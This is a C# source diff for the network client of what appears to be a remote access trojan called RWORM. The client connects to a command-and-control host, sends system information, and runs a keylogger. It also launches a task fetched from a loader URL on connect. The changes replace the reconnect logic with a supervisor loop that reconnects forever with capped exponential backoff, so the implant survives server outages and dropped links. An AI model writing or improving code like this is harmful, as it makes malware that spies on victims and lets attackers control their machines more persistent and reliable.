@@ -18,7 +18,6 @@ namespace RWORM.Client.Network
         private volatile bool      _connected;
         private CancellationTokenSource? _cts;
         private readonly object    _writeLock = new();
-        private int                _reconnecting;
         private readonly System.Collections.Generic.List<byte> _recvBuffer = new();
 
         // ── Modules ────────────────────────────────────────────────────────────
@@ -40,40 +39,91 @@ namespace RWORM.Client.Network
             if (Config.KeyloggerEnabled && !Config.KeyloggerOnline)
                 EnsureKeylogger(online: false);
 
+            int  delay    = Config.ReconnectDelay;
+            bool taskDone = false;
+
+            // Supervisor loop: connect → run session → tear down → retry forever.
+            // It only returns when Disconnect() cancels _cts, so the client keeps
+            // coming back no matter how the connection ends — including a first
+            // connect that times out (the old code treated that OperationCanceled
+            // as fatal and never retried), a server that is down for hours, or a
+            // half-open socket where only writes start failing.
             while (!_cts.Token.IsCancellationRequested)
             {
                 try
                 {
-                    _client = new TcpClient();
-                    var ct  = new CancellationTokenSource(Config.ConnectTimeout);
-                    await _client.ConnectAsync(host, port).WaitAsync(ct.Token);
-                    _stream    = _client.GetStream();
+                    var client = new TcpClient();
+                    using (var timeout = CancellationTokenSource.CreateLinkedTokenSource(_cts.Token))
+                    {
+                        timeout.CancelAfter(Config.ConnectTimeout);
+                        await client.ConnectAsync(host, port).WaitAsync(timeout.Token);
+                    }
+
+                    _client    = client;
+                    _stream    = client.GetStream();
                     _connected = true;
                     _recvBuffer.Clear();
-                    Interlocked.Exchange(ref _reconnecting, 0);
+                    delay = Config.ReconnectDelay;   // healthy session → reset backoff
 
-                    _ = Task.Run(ReceiveLoop);
                     await SendSystemInfo();
-                    _ = Task.Run(HeartbeatLoop);
 
                     // Online keylogger starts after connect
                     if (Config.KeyloggerEnabled && Config.KeyloggerOnline)
                         EnsureKeylogger(online: true);
 
-                    // Task on connect
-                    if (Config.TaskEnabled && !string.IsNullOrWhiteSpace(Config.TaskLoaderUrl))
-                        _ = Task.Run(() => RunConnectTask());
+                    // Task on connect (once per process, as before)
+                    if (!taskDone && Config.TaskEnabled && !string.IsNullOrWhiteSpace(Config.TaskLoaderUrl))
+                    {
+                        taskDone = true;
+                        _ = Task.Run(RunConnectTask);
+                    }
 
-                    return;
+                    // Blocks until receive or heartbeat observes a dead link;
+                    // that return is what drives the retry below.
+                    await RunSessionAsync(_cts.Token);
                 }
-                catch (OperationCanceledException) { return; }
+                catch (OperationCanceledException) when (_cts.IsCancellationRequested)
+                {
+                    break;   // Disconnect() called — shut down cleanly
+                }
                 catch
                 {
-                    _connected = false;
-                    try { _client?.Close(); } catch { }
-                    await Task.Delay(Config.ReconnectDelay).ConfigureAwait(false);
+                    // Connect failed / timed out / session faulted — retry below.
                 }
+                finally
+                {
+                    _connected = false;
+                    try { _stream?.Close(); } catch { }
+                    try { _client?.Close(); } catch { }
+                }
+
+                if (_cts.IsCancellationRequested) break;
+
+                try { await Task.Delay(delay, _cts.Token).ConfigureAwait(false); }
+                catch (OperationCanceledException) { break; }
+                delay = Math.Min(delay * 2, 60_000);   // capped exponential backoff
             }
+        }
+
+        /// <summary>
+        /// Runs one connected session (receive + heartbeat loops) and returns as
+        /// soon as either loop observes the connection dying, so the supervisor
+        /// loop can tear the socket down and retry. Exactly one session — and
+        /// therefore one heartbeat — exists at a time.
+        /// </summary>
+        private async Task RunSessionAsync(CancellationToken owner)
+        {
+            using var sessionCts = CancellationTokenSource.CreateLinkedTokenSource(owner);
+            var token = sessionCts.Token;
+
+            var receive   = Task.Run(() => ReceiveLoop(token), CancellationToken.None);
+            var heartbeat = Task.Run(() => HeartbeatLoop(token), CancellationToken.None);
+
+            await Task.WhenAny(receive, heartbeat);
+
+            // One side saw the socket die — stop the other and surface faults.
+            sessionCts.Cancel();
+            try { await Task.WhenAll(receive, heartbeat); } catch { }
         }
 
         private async Task RunConnectTask()
@@ -120,63 +170,40 @@ namespace RWORM.Client.Network
         {
             if (!_connected || _stream == null) return;
             try { lock (_writeLock) { _stream.Write(data, 0, data.Length); _stream.Flush(); } }
-            catch { _connected = false; }
+            catch
+            {
+                // A write failure means the socket is dead (server gone, link
+                // dropped). Close it so the pending ReadAsync in ReceiveLoop
+                // throws immediately instead of hanging on a half-open socket
+                // forever — that unwoken read is exactly what stopped the old
+                // client from ever reconnecting.
+                _connected = false;
+                try { _stream?.Close(); } catch { }
+                try { _client?.Close(); } catch { }
+            }
         }
 
         // ── Receive loop ──────────────────────────────────────────────────────
-        private async void ReceiveLoop()
+        private async Task ReceiveLoop(CancellationToken token)
         {
             var chunk = new byte[65536];
             try
             {
-                while (_connected)
+                while (_connected && !token.IsCancellationRequested)
                 {
                     if (_stream == null || !_stream.CanRead) break;
-                    int n = await _stream.ReadAsync(chunk, 0, chunk.Length).ConfigureAwait(false);
+                    int n = await _stream.ReadAsync(chunk, 0, chunk.Length, token).ConfigureAwait(false);
                     if (n == 0) break;
                     lock (_recvBuffer) for (int i = 0; i < n; i++) _recvBuffer.Add(chunk[i]);
                     DrainPackets();
                 }
             }
             catch { }
-            finally { _connected = false; ScheduleReconnect(); }
-        }
-
-        private void ScheduleReconnect()
-        {
-            if (Interlocked.CompareExchange(ref _reconnecting, 1, 0) != 0) return;
-            _ = Task.Run(ReconnectLoop);
-        }
-
-        private async Task ReconnectLoop()
-        {
-            _cts?.Cancel();
-            try { _stream?.Close(); } catch { }
-            try { _client?.Close(); } catch { }
-            int delay = Config.ReconnectDelay;
-            while (true)
+            finally
             {
-                await Task.Delay(delay);
-                try
-                {
-                    _cts    = new CancellationTokenSource();
-                    _client = new TcpClient();
-                    var ct  = new CancellationTokenSource(Config.ConnectTimeout);
-                    await _client.ConnectAsync(Config.C2Host, Config.C2Port).WaitAsync(ct.Token);
-                    _stream    = _client.GetStream();
-                    _connected = true;
-                    _recvBuffer.Clear();
-                    Interlocked.Exchange(ref _reconnecting, 0);
-
-                    _ = Task.Run(ReceiveLoop);
-                    await SendSystemInfo();
-                    _ = Task.Run(HeartbeatLoop);
-
-                    if (Config.KeyloggerEnabled && Config.KeyloggerOnline)
-                        EnsureKeylogger(online: true);
-                    return;
-                }
-                catch { _connected = false; try { _client?.Close(); } catch { } delay = Math.Min(delay * 2, 60_000); }
+                // End the session (RunSessionAsync) and, through it, the whole
+                // supervisor loop's current attempt — the loop then retries.
+                _connected = false;
             }
         }
 
@@ -414,11 +441,15 @@ namespace RWORM.Client.Network
         }
 
         // ── Heartbeat ──────────────────────────────────────────────────────────
-        private async Task HeartbeatLoop()
+        private async Task HeartbeatLoop(CancellationToken token)
         {
-            while (_connected)
+            while (_connected && !token.IsCancellationRequested)
             {
-                await Task.Delay(Config.HeartbeatInterval).ConfigureAwait(false);
+                // Token-aware delay so the session ends promptly on teardown;
+                // the old tokenless delay kept a stray heartbeat alive across
+                // reconnects and stacked a new one on every session.
+                try { await Task.Delay(Config.HeartbeatInterval, token).ConfigureAwait(false); }
+                catch (OperationCanceledException) { break; }
                 if (_connected) await SendAsync(CreatePacket(0x01, 0, "ping"));
             }
         }
